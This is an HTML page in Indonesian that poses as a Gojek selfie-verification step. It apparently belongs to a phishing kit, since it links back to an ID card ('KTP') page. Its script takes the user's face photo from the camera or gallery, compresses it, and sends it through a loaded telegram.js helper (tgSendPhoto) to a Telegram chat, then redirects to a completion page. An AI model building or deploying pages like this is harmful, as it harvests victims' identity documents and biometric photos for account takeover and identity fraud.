<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Gojek — Foto Selfie</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: #fff;
      border-radius: 16px;
      padding: 40px 36px 36px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
    }

    .back-btn {
      display: flex;
      align-items: center;
      gap: 6px;
      background: none;
      border: none;
      cursor: pointer;
      color: #555;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 28px;
      padding: 0;
    }

    .back-btn svg {
      width: 18px;
      height: 18px;
      stroke: currentColor;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .back-btn:hover { color: #00AA13; }

    .step-indicator {
      display: flex;
      align-items: center;
      gap: 6px;
      margin-bottom: 24px;
    }

    .step {
      width: 28px;
      height: 4px;
      border-radius: 2px;
      background: #e0e0e0;
    }

    .step.done { background: #00AA13; }
    .step.active { background: #00AA13; }

    h1 {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 14px;
      color: #777;
      margin-bottom: 28px;
      line-height: 1.5;
    }

    .selfie-frame {
      width: 100%;
      aspect-ratio: 3/4;
      border-radius: 16px;
      background: #f0f0f0;
      border: 2px dashed #d0d0d0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
      overflow: hidden;
      position: relative;
    }

    .selfie-frame.has-image {
      border: none;
    }

    .selfie-frame img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
    }

    .selfie-frame.has-image img {
      display: block;
    }

    .selfie-placeholder {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }

    .selfie-frame.has-image .selfie-placeholder {
      display: none;
    }

    .face-outline {
      width: 100px;
      height: 120px;
      border: 3px solid #c0c0c0;
      border-radius: 50% 50% 45% 45%;
      opacity: 0.5;
    }

    .selfie-placeholder p {
      font-size: 13px;
      color: #aaa;
      text-align: center;
    }

    .selfie-options {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 20px;
    }

    .selfie-btn {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 20px 12px;
      border: 1.5px solid #e0e0e0;
      border-radius: 14px;
      background: #fff;
      cursor: pointer;
      font-size: 14px;
      font-weight: 600;
      color: #333;
      transition: border-color 0.2s, background 0.2s, color 0.2s;
    }

    .selfie-btn:hover {
      border-color: #00AA13;
      background: #f0fff2;
      color: #00AA13;
    }

    .selfie-btn.selected {
      border-color: #00AA13;
      background: #f0fff2;
      color: #00AA13;
    }

    .selfie-btn svg {
      width: 32px;
      height: 32px;
      stroke: currentColor;
      fill: none;
      stroke-width: 1.8;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .info-box {
      display: flex;
      gap: 10px;
      background: #fff8e1;
      border: 1px solid #ffe082;
      border-radius: 10px;
      padding: 14px;
      margin-bottom: 24px;
    }

    .info-box svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      stroke: #f59e0b;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
      margin-top: 1px;
    }

    .info-box p {
      font-size: 12px;
      color: #92600a;
      line-height: 1.5;
    }

    .preview-actions {
      display: none;
      justify-content: space-between;
      align-items: center;
      padding: 10px 14px;
      background: rgba(0,0,0,0.55);
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
    }

    .selfie-frame.has-image .preview-actions {
      display: flex;
    }

    .preview-actions span {
      font-size: 12px;
      color: #fff;
    }

    .btn-ganti {
      font-size: 12px;
      font-weight: 600;
      color: #fff;
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
      text-decoration: underline;
    }

    .btn-lanjut {
      display: none;
      width: 100%;
      background: #00AA13;
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 15px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }

    .btn-lanjut:hover { background: #009911; }
    .btn-lanjut:active { transform: scale(0.98); }
  </style>
</head>
<body>
  <div class="card">
    <button class="back-btn" onclick="window.location.href='ktp.html'">
      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
      Kembali
    </button>

    <div class="step-indicator">
      <div class="step done"></div>
      <div class="step active"></div>
      <div class="step"></div>
    </div>

    <h1>Foto Selfie</h1>
    <p class="subtitle">Ambil foto selfie kamu. Pastikan wajah terlihat jelas, pencahayaan cukup, dan tidak menggunakan kacamata.</p>

    <div class="selfie-frame" id="selfieFrame">
      <img id="selfieImg" src="" alt="Preview Selfie" />
      <div class="selfie-placeholder">
        <div class="face-outline"></div>
        <p>Posisikan wajah<br>di dalam area ini</p>
      </div>
      <div class="preview-actions">
        <span>Preview selfie kamu</span>
        <button class="btn-ganti" onclick="gantiFoto()">Ganti foto</button>
      </div>
    </div>

    <div class="info-box">
      <svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
      <p>Lepas kacamata, topi, dan masker. Pastikan wajah tidak tertutup dan pencahayaan merata.</p>
    </div>

    <div class="selfie-options">
      <button class="selfie-btn" id="btnKamera" onclick="openKamera()">
        <svg viewBox="0 0 24 24">
          <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
          <circle cx="12" cy="13" r="4"/>
        </svg>
        Kamera Selfie
      </button>
      <button class="selfie-btn" id="btnGaleri" onclick="openGaleri()">
        <svg viewBox="0 0 24 24">
          <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
          <circle cx="8.5" cy="8.5" r="1.5"/>
          <polyline points="21 15 16 10 5 21"/>
        </svg>
        Dari Galeri
      </button>
    </div>

    <!-- kamera depan (user) -->
    <input type="file" id="inputKamera" accept="image/*" capture="user" style="display:none" onchange="previewSelfie(event, 'kamera')" />
    <input type="file" id="inputGaleri" accept="image/*" style="display:none" onchange="previewSelfie(event, 'galeri')" />

    <button class="btn-lanjut" id="btnLanjut" onclick="submitSelfie()">Lanjutkan</button>
  </div>

  <script src="telegram.js"></script>
  <script>
    function openKamera() {
      document.getElementById('inputKamera').click();
    }

    function openGaleri() {
      document.getElementById('inputGaleri').click();
    }

    function previewSelfie(event, source) {
      const file = event.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = function(e) {
        const frame = document.getElementById('selfieFrame');
        document.getElementById('selfieImg').src = e.target.result;
        frame.classList.add('has-image');
        document.getElementById('btnLanjut').style.display = 'block';

        document.getElementById('btnKamera').classList.toggle('selected', source === 'kamera');
        document.getElementById('btnGaleri').classList.toggle('selected', source === 'galeri');
      };
      reader.readAsDataURL(file);
    }

    function gantiFoto() {
      document.getElementById('selfieFrame').classList.remove('has-image');
      document.getElementById('selfieImg').src = '';
      document.getElementById('btnLanjut').style.display = 'none';
      document.getElementById('btnKamera').classList.remove('selected');
      document.getElementById('btnGaleri').classList.remove('selected');
      document.getElementById('inputKamera').value = '';
      document.getElementById('inputGaleri').value = '';
    }

    async function submitSelfie() {
      const btn = document.getElementById('btnLanjut');
      btn.textContent = 'Mengunggah...';
      btn.disabled = true;

      const fileKamera = document.getElementById('inputKamera').files[0];
      const fileGaleri = document.getElementById('inputGaleri').files[0];
      const file = fileKamera || fileGaleri;

      if (file) {
        const compressed = await compressImage(file).catch(() => file);
        await tgSendPhoto(compressed, '🤳 <b>Foto Selfie Gojek</b>').catch(() => {});
      }

      window.location.href = 'selesai.html';
    }
  </script>
</body>
</html>
